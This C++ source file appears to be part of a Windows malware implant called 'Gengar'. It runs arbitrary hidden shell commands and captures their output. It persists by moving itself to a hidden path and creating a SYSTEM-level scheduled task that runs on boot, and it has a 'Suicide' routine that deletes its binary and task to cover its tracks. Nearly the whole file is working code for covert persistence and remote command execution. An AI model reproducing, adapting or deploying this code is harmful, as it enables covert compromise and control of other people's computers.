#include <sstream>
#include <boost/process.hpp>
#include <boost/process/windows.hpp>
#include "machine.h"
#include "config.h"

namespace bp = boost::process;
std::string quotify(std::string str)
{
	return '"' + str + '"';
}

std::string GetGengarPath()
{
	const short buff_size = 128;
	char exe_path[buff_size];
	GetModuleFileNameA(nullptr, exe_path, buff_size);
	return exe_path;
}

void ReadStream(bp::ipstream& stream, std::string& output)
{
	std::string buff;
	while (std::getline(stream, buff))
	{
		if (buff.back() == '\r')
			buff.pop_back();
		buff.push_back('\n');
		output.append(buff);
	}
}

std::string Machine::RunShellCommand(std::string cmd)
{
	std::string output;
	bp::ipstream out_stream, err_stream;

	bp::system("cmd /c " + cmd, bp::std_out > out_stream, bp::std_err > err_stream, bp::windows::create_no_window);
	ReadStream(out_stream, output);
	ReadStream(err_stream, output);
	return output;
}

void Machine::Persist()
{
	MoveGengarToHiddenPath();
	ScheduleGengarOnBoot();
}

void Machine::MoveGengarToHiddenPath()
{
	MoveFileA(GetGengarPath().c_str(), GENGAR_PATH.c_str());
}

void Machine::ScheduleGengarOnBoot()
{
	std::string cmd = "schtasks /Create /F /RU SYSTEM /SC ONSTART /TN " + quotify(TASK_NAME) + " /TR " + quotify(GENGAR_PATH);
	RunShellCommand(cmd);
}

void Machine::DeleteGengar()
{
	DeleteFileA(GENGAR_PATH.c_str());
}

void Machine::DeleteGengarSchedule()
{
	std::string cmd = "schtasks /Delete /F /TN " + quotify(TASK_NAME);
	RunShellCommand(cmd);
}

void Machine::Suicide()
{
	DeleteGengar();
	DeleteGengarSchedule();
	std::exit(0);
}
